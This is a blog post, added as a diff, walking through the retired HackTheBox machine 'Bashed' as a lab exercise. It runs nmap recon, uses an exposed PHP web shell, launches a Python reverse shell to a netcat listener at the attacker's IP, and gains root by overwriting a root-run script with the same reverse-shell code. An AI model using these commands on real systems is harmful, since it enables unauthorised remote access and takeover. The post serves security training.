@@ -1,0 +1,255 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HackTheBox Writeup: Bashed // Securing The Net</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.58.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="AJ McQuay" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://securingthe.net/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Writeup: Bashed"/>
+<meta name="twitter:description" content="As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker. The best way to learn is by doing, and one of my favorite ways to practice is HackTheBox.
+The machine named Bashed was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.
+Recon As usual with a HackTheBox target system, all you have at the onset is a name and IP address."/>
+
+    <meta property="og:title" content="HackTheBox Writeup: Bashed" />
+<meta property="og:description" content="As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker. The best way to learn is by doing, and one of my favorite ways to practice is HackTheBox.
+The machine named Bashed was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.
+Recon As usual with a HackTheBox target system, all you have at the onset is a name and IP address." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://securingthe.net/post/hackthebox-bashed/" />
+<meta property="article:published_time" content="2018-05-05T02:47:50+00:00" />
+<meta property="article:modified_time" content="2018-05-05T02:47:50+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://securingthe.net"><img class="app-header-avatar" src="/avatar.jpg" alt="AJ McQuay" /></a>
+      <h1>Securing The Net</h1>
+      <p>Tech ramblings from the desert</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://twitter.com/x41x4a" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HackTheBox Writeup: Bashed</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          May 5, 2018
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          7 min read
+        </div><div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+          <a class="tag" href="https://securingthe.net/tags/linux/">Linux</a><a class="tag" href="https://securingthe.net/tags/hackthebox/">HackTheBox</a></div></div>
+    </header>
+    <div class="post-content">
+      
+
+<p>As a career blue teamer I feel it&rsquo;s important to understand the tools, techniques, and thought processes of an attacker.  The best way to learn is by doing, and one of my favorite ways to practice is <a href="https://hackthebox.eu">HackTheBox</a>.</p>
+
+<p>The machine named <em>Bashed</em> was recently retired so walkthroughs for it have been popping up everywhere. This one is mine.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>As usual with a HackTheBox target system, all you have at the onset is a name and IP address. My starting point is usually an nmap scan against the target machine&rsquo;s IP.</p>
+
+<pre><code>nmap -sC -sV -oA nmap 10.10.10.68
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:05 EST
+Nmap scan report for 10.10.10.68
+Host is up (0.17s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Arrexel's Development Site
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.71 seconds
+</code></pre>
+
+<p>Ok, TCP 80 / HTTP is listening.  There are several options for investigating further, but before opening a web browser I continued with nmap and ran the http-enum script.</p>
+
+<pre><code>nmap --script http-enum 10.10.10.68
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-12 16:07 EST
+Nmap scan report for 10.10.10.68
+Host is up (0.17s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+| http-enum:
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
+|_  /uploads/: Potentially interesting folder
+Nmap done: 1 IP address (1 host up) scanned in 46.16 seconds
+</code></pre>
+
+<p>The /dev directory contains a couple of scripts.  Visiting <a href="http://10.10.10.68/dev/phpbash.php">http://10.10.10.68/dev/phpbash.php</a> in a browser presented me with a web shell (!).  I&rsquo;m able to navigate the file structure and read the contents of /home.  Getting user.txt is a simple exercise at this point.</p>
+
+<p><img src="/content/images/2018/05/bashed_user.png" alt="bashed_user" /></p>
+
+<p><strong>user = owned</strong></p>
+
+<h1 id="gaining-a-foothold">Gaining a Foothold</h1>
+
+<p>I need to get a &ldquo;real&rdquo; shell on the box to go any further. I choose one of my favorite reverse shell one-liners and see if it will work from the PHP web shell.</p>
+
+<p>First, I&rsquo;ll need a listener on my local attacker machine:</p>
+
+<pre><code>nc -v -n -l -p 4444
+</code></pre>
+
+<p>Now I drop this python script directly in the web shell.  The ampersand (&amp;) at the end just backgrounds the process.</p>
+
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;my HTB IP address&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &amp;
+</code></pre>
+
+<p>Note that the field &ldquo;my HTB IP address&rdquo; would be the 10.10.x.x IP assigned to the VPN interface on my machine (usually tap0 on Kali Linux) when I&rsquo;m connected to the HTB environment, and the port number (4444) is the same one I used to start the netcat listener in the previous step.</p>
+
+<p><img src="/content/images/2018/05/bashed_revshell1.png" alt="bashed_revshell1" /></p>
+
+<p>Now I have a reverse shell on the target system, but it&rsquo;s still limited. I try using python again to escape to a bash shell.</p>
+
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+
+<p><img src="/content/images/2018/05/bashed_revshell2.png" alt="bashed_revshell2" /></p>
+
+<p>Great, now I&rsquo;m at a more typical shell as user www-data.  Time to enumerate.</p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>I checked many many things, but looking at sudo capabilities turned up some useful information.</p>
+
+<pre><code>www-data@bashed:/var/www/html/dev$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on bashed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User www-data may run the following commands on bashed:
+    (scriptmanager : scriptmanager) NOPASSWD: ALL
+</code></pre>
+
+<p>So, my current user (www-data) can run ALL commands as user scriptmanager with no password? I decide to try becoming scriptmanager.</p>
+
+<pre><code>www-data@bashed:/var/www/html/dev$ sudo -i -u scriptmanager
+sudo -i -u scriptmanager
+scriptmanager@bashed:~$
+</code></pre>
+
+<p>From the <a href="https://www.sudo.ws/man/1.8.3/sudo.man.html">sudo man page</a>:</p>
+
+<blockquote>
+<p>-i [command]
+The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell. This means that login-specific resource files such as .profile or .login will be read by the shell. If a command is specified, it is passed to the shell for execution via the shell&rsquo;s -c option. ==If no command is specified, an interactive shell is executed.== sudo attempts to change to that user&rsquo;s home directory before running the shell. The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in. The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers policy is in use.</p>
+</blockquote>
+
+<p>Bingo, now I&rsquo;m scriptmanager.  More enumeration.</p>
+
+<pre><code>scriptmanager@bashed:/var/www/html/dev$ ls -l /
+ls -l /
+total 80
+drwxr-xr-x   2 root          root           4096 Dec  4 11:22 bin
+drwxr-xr-x   3 root          root           4096 Dec  4 11:17 boot
+drwxr-xr-x  19 root          root           4240 Jan 12 20:25 dev
+drwxr-xr-x  89 root          root           4096 Dec  4 17:09 etc
+drwxr-xr-x   4 root          root           4096 Dec  4 13:53 home
+lrwxrwxrwx   1 root          root             32 Dec  4 11:14 initrd.img -&gt; boot/initrd.img-4.4.0-62-generic
+drwxr-xr-x  19 root          root           4096 Dec  4 11:16 lib
+drwxr-xr-x   2 root          root           4096 Dec  4 11:13 lib64
+drwx------   2 root          root          16384 Dec  4 11:13 lost+found
+drwxr-xr-x   4 root          root           4096 Dec  4 11:13 media
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 mnt
+drwxr-xr-x   2 root          root           4096 Dec  4 11:18 opt
+dr-xr-xr-x 122 root          root              0 Jan 12 20:24 proc
+drwx------   3 root          root           4096 Dec  4 13:03 root
+drwxr-xr-x  18 root          root            500 Jan 12 20:25 run
+drwxr-xr-x   2 root          root           4096 Dec  4 11:18 sbin
+drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4 18:06 scripts
+drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
+dr-xr-xr-x  13 root          root              0 Jan 12 20:24 sys
+drwxrwxrwt  10 root          root           4096 Jan 12 21:07 tmp
+drwxr-xr-x  10 root          root           4096 Dec  4 11:13 usr
+drwxr-xr-x  12 root          root           4096 Dec  4 11:20 var
+lrwxrwxrwx   1 root          root             29 Dec  4 11:14 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic
+</code></pre>
+
+<p>Strange, <code>scripts</code> isn&rsquo;t a typical top-level directory and it&rsquo;s owned by scriptmanager. I move into the directory and investigate further.</p>
+
+<pre><code>scriptmanager@bashed:/scripts$ ls -al
+ls -al
+total 16
+drwxrwxr--  2 scriptmanager scriptmanager 4096 Apr 20 08:14 .
+drwxr-xr-x 23 root          root          4096 Dec  4 13:02 ..
+-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4 17:03 test.py
+-rw-r--r--  1 root          root            12 Apr 20 08:18 test.txt
+</code></pre>
+
+<p>Examining these two files leads me to believe that <code>test.txt</code> containts output from the <code>test.py</code> script.  However,<code>test.txt</code> is owned by root while the directory it resides in and the <code>test.py</code> script that generates it are owned by scriptmanager.</p>
+
+<p>This implies that root is executing the script as itself, so the output is written with root ownership. If I can replace <code>test.py</code> with my own malicious version I can do something on the target machine with root privileges. Reverse shell time!</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<pre><code>scriptmanager@bashed:/scripts$ mv test.py old-test.py
+scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;my HTB IP address&gt;&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' &gt; test.py
+</code></pre>
+
+<p>Here I moved/renamed the existing <code>test.py</code> and created my own with the reverse shell code. This isn&rsquo;t necessary, you could just add the reverse shell bits to the end of the existing file.</p>
+
+<p>Again note the &ldquo;my HTB IP address field&rdquo; and port number. I want a second reverse shell that&rsquo;s separate from the one I&rsquo;m currently working in, so I selected a new port (5555).</p>
+
+<p>I&rsquo;m not exactly sure how or when root executes the <code>test.py</code> script.  Given the autonomous nature of these HTB systems I assume it&rsquo;s just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.</p>
+
+<p>After a few minutes&hellip;</p>
+
+<p><img src="/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png" alt="94582eeb-e301-49ba-9bf2-64769b24438c" /></p>
+
+<p><strong>root = owned</strong></p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>Looking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:</p>
+
+<ol>
+<li>Look at the simple or obvious things first.  Don&rsquo;t assume every target is going to require some elaborate, complicated method to exploit.</li>
+<li>Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <code>test.txt</code> and <code>test.py</code></li>
+</ol>
+
+<p>Did you conquer Bashed using some other method?  Feel free to reach out to me on <a href="https://twitter.com/aj_mcquay">Twitter</a>, I&rsquo;d love to talk about it.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
